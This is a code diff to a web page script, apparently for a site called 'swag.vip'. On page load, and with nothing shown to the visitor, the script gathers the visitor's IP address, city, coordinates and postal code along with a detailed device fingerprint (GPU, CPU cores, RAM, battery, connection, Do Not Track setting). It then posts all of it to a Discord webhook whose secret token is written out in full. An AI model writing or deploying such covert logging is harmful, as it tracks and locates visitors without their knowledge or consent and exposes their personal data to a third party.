@@ -636,85 +636,143 @@
         else if (ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1) os = 'iOS';
 
         var device = /Mobi|Android|iPhone|iPad|iPod/i.test(ua) ? 'Mobile' : 'Desktop';
-
+        var platform = navigator.platform || 'N/A';
         var lang = navigator.language || navigator.userLanguage || 'N/A';
         var tz = Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A';
         var screenRes = screen.width + 'x' + screen.height;
+        var colorDepth = screen.colorDepth + '-bit';
+        var pixelRatio = window.devicePixelRatio || 1;
+        var cpuCores = navigator.hardwareConcurrency || 'N/A';
+        var ram = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A';
+        var touch = 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? 'Oui' : 'Non';
+        var cookies = navigator.cookieEnabled ? 'Oui' : 'Non';
+        var doNotTrack = navigator.doNotTrack || 'N/A';
         var referrer = document.referrer || 'Direct';
         if (referrer.length > 100) referrer = referrer.substring(0, 100) + '...';
+
+        var gpu = 'N/A';
+        try {
+            var c = document.createElement('canvas');
+            var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+            if (gl) {
+                var dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                if (dbg) gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+            }
+        } catch(e) {}
+
+        var connType = 'N/A';
+        var connDown = 'N/A';
+        var connUp = 'N/A';
+        try {
+            var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (conn) {
+                connType = conn.effectiveType || conn.type || 'N/A';
+                connDown = conn.downlink ? conn.downlink + ' Mbps' : 'N/A';
+                connUp = conn.rtt ? conn.rtt + ' ms (latence)' : 'N/A';
+            }
+        } catch(e) {}
+
+        var batteryLevel = 'N/A';
+        var charging = 'N/A';
+        var batteryPromise = navigator.getBattery ? navigator.getBattery() : null;
+
+        var perfData = 'N/A';
+        try {
+            var p = performance.timing;
+            var loadTime = p.loadEventEnd - p.navigationStart;
+            if (loadTime > 0) perfData = loadTime + ' ms';
+        } catch(e) {}
+
+        function sendWebhook(extraFields) {
+            var now = new Date();
+            var date = now.toLocaleDateString('fr-FR');
+            var heure = now.toLocaleTimeString('fr-FR');
+
+            var fields = [
+                { name: 'IP', value: '||`' + ip + '`||', inline: true },
+                { name: 'Date', value: date + ' ' + heure, inline: true },
+                { name: '\u200b', value: '\u200b', inline: false },
+                { name: 'Pays', value: (geo.country_name || 'N/A') + ' ' + (geo.country_code ? ':' + geo.country_code.toLowerCase() + ':' : ''), inline: true },
+                { name: 'Ville', value: geo.city || 'N/A', inline: true },
+                { name: 'Region', value: geo.region || 'N/A', inline: true },
+                { name: 'ISP', value: (geo.org || 'N/A').substring(0, 80), inline: false },
+                { name: '\u200b', value: '\u200b', inline: false },
+                { name: 'Navigateur', value: browser, inline: true },
+                { name: 'OS', value: os, inline: true },
+                { name: 'Appareil', value: device, inline: true },
+                { name: 'Platform', value: platform, inline: true },
+                { name: 'CPU Cores', value: '' + cpuCores, inline: true },
+                { name: 'RAM', value: ram, inline: true },
+                { name: 'GPU', value: '`' + gpu.substring(0, 80) + '`', inline: false },
+                { name: '\u200b', value: '\u200b', inline: false },
+                { name: 'Connexion', value: connType, inline: true },
+                { name: 'Vitesse DL', value: connDown, inline: true },
+                { name: 'Latence', value: connUp, inline: true },
+                { name: 'Batterie', value: batteryLevel + (charging !== 'N/A' ? (charging ? ' :green_circle:' : ' :red_circle:') : ''), inline: true },
+                { name: 'Touch', value: touch, inline: true },
+                { name: 'Cookies', value: cookies, inline: true },
+                { name: 'Do Not Track', value: doNotTrack, inline: true },
+                { name: '\u200b', value: '\u200b', inline: false },
+                { name: 'Langue', value: lang, inline: true },
+                { name: 'Fuseau horaire', value: tz, inline: true },
+                { name: 'Résolution', value: screenRes, inline: true },
+                { name: 'Pixel Ratio', value: '' + pixelRatio, inline: true },
+                { name: 'Color Depth', value: colorDepth, inline: true },
+                { name: 'Load Time', value: perfData, inline: true },
+                { name: '\u200b', value: '\u200b', inline: false },
+                { name: 'Referrer', value: referrer, inline: false }
+            ];
+
+            if (geo.latitude && geo.longitude) {
+                fields.push({ name: 'Coordonnées', value: '||`' + geo.latitude + ', ' + geo.longitude + '`||', inline: true });
+            }
+            if (geo.postal) {
+                fields.push({ name: 'Code postal', value: geo.postal, inline: true });
+            }
+            if (extraFields) {
+                fields = fields.concat(extraFields);
+            }
+
+            fetch('https://ptb.discord.com/api/webhooks/1530049010847449219/El-pK11mF902pbR4TJAOKWLtqHdHbZRFOs9TBKpr2ao6kjVF-cJZVSVGGEZ4taBA1bAV', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    embeds: [{
+                        title: 'New Visitor',
+                        color: 2894892,
+                        fields: fields,
+                        footer: { text: 'swag.vip' }
+                    }]
+                })
+            });
+        }
+
+        var ip, geo;
 
         fetch('https://api.ipify.org?format=json')
             .then(function(r) { return r.json(); })
             .then(function(ipData) {
-                var ip = ipData.ip;
-                return fetch('https://ipapi.co/' + ip + '/json/')
-                    .then(function(r) { return r.json(); })
-                    .then(function(geo) {
-                        var now = new Date();
-                        var date = now.toLocaleDateString('fr-FR');
-                        var heure = now.toLocaleTimeString('fr-FR');
-
-                        var fields = [
-                            { name: 'IP', value: '||`' + ip + '`||', inline: true },
-                            { name: 'Date', value: date + ' ' + heure, inline: true },
-                            { name: '\u200b', value: '\u200b', inline: false },
-                            { name: 'Pays', value: (geo.country_name || 'N/A') + ' ' + (geo.country_code ? ':' + geo.country_code.toLowerCase() + ':' : ''), inline: true },
-                            { name: 'Ville', value: geo.city || 'N/A', inline: true },
-                            { name: 'Region', value: geo.region || 'N/A', inline: true },
-                            { name: 'ISP', value: geo.org || 'N/A', inline: false },
-                            { name: '\u200b', value: '\u200b', inline: false },
-                            { name: 'Navigateur', value: browser, inline: true },
-                            { name: 'OS', value: os, inline: true },
-                            { name: 'Appareil', value: device, inline: true },
-                            { name: 'Langue', value: lang, inline: true },
-                            { name: 'Fuseau horaire', value: tz, inline: true },
-                            { name: 'Résolution', value: screenRes, inline: true },
-                            { name: '\u200b', value: '\u200b', inline: false },
-                            { name: 'Referrer', value: referrer, inline: false }
-                        ];
-
-                        if (geo.latitude && geo.longitude) {
-                            fields.push({ name: 'Coordonnées', value: geo.latitude + ', ' + geo.longitude, inline: true });
-                        }
-                        if (geo.postal) {
-                            fields.push({ name: 'Code postal', value: geo.postal, inline: true });
-                        }
-
-                        fetch('https://ptb.discord.com/api/webhooks/1530049010847449219/El-pK11mF902pbR4TJAOKWLtqHdHbZRFOs9TBKpr2ao6kjVF-cJZVSVGGEZ4taBA1bAV', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                embeds: [{
-                                    title: 'New Visitor',
-                                    color: 2894892,
-                                    fields: fields,
-                                    footer: { text: 'swag.vip' }
-                                }]
-                            })
-                        });
-                    });
+                ip = ipData.ip;
+                return fetch('https://ipapi.co/' + ip + '/json/');
+            })
+            .then(function(r) { return r.json(); })
+            .then(function(geoData) {
+                geo = geoData;
+                if (batteryPromise) {
+                    batteryPromise.then(function(b) {
+                        batteryLevel = Math.round(b.level * 100) + '%';
+                        charging = b.charging;
+                        sendWebhook();
+                    }).catch(function() { sendWebhook(); });
+                } else {
+                    sendWebhook();
+                }
             })
             .catch(function() {
-                var now = new Date();
-                fetch('https://ptb.discord.com/api/webhooks/1530049010847449219/El-pK11mF902pbR4TJAOKWLtqHdHbZRFOs9TBKpr2ao6kjVF-cJZVSVGGEZ4taBA1bAV', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        embeds: [{
-                            title: 'New Visitor (partial)',
-                            color: 16776960,
-                            fields: [
-                                { name: 'Navigateur', value: browser, inline: true },
-                                { name: 'OS', value: os, inline: true },
-                                { name: 'Appareil', value: device, inline: true },
-                                { name: 'Langue', value: lang, inline: true },
-                                { name: 'Résolution', value: screenRes, inline: true },
-                                { name: 'Referrer', value: referrer, inline: false }
-                            ],
-                            footer: { text: 'swag.vip - IP non disponible' }
-                        }]
-                    })
-                });
+                ip = 'N/A'; geo = {};
+                sendWebhook([
+                    { name: 'Status', value: 'IP non disponible', inline: false }
+                ]);
             });
     </script>
 </body>
